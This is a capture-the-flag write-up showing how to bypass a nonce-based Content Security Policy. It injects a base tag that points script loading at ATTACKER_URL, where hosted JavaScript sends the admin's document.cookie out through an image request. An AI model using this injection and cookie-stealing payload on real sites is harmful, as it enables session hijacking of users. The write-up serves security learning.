---
description: Content Security Policy bypass using base tag
---

# XwaSS ftw?

> Just another typical web challenge that will be solved anyway :/\
> Link: http://128.199.3.34:1236
>
> **Author:** Kahla

In this challenge, we have HTML injection through the `src=` parameter, but the CSP does not allow the loading of arbitrary scripts.

```markup
<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-6kzZgPLe1fqRq8';connect-src 'self';style-src 'self';font-src 'self';object-src 'none'">
```

Thankfully, the following script is included in the response, which is permitted by the `nonce`.

```markup
<script nonce=6kzZgPLe1fqRq8  src="assets/js/bootstrap.js">
```

We could therefore use the `<base>` tag to set the base URL of the document to our attacker-controlled site.

```html
?src=/img/saturn.jpg'><base href="http://ATTACKER_URL">
```

This will load the script `http://ATTACKER_URL/assets/js/bootstrap.js`, which we can host on our server:

```javascript
let img = document.createElement('img');
img.src = "/?" + btoa(document.cookie)

document.body.appendChild(img);
```

The above payload will cause the browser to fetch `/?${document.cookie}`, which will be logged on our server, allowing us to get the admin's cookie.
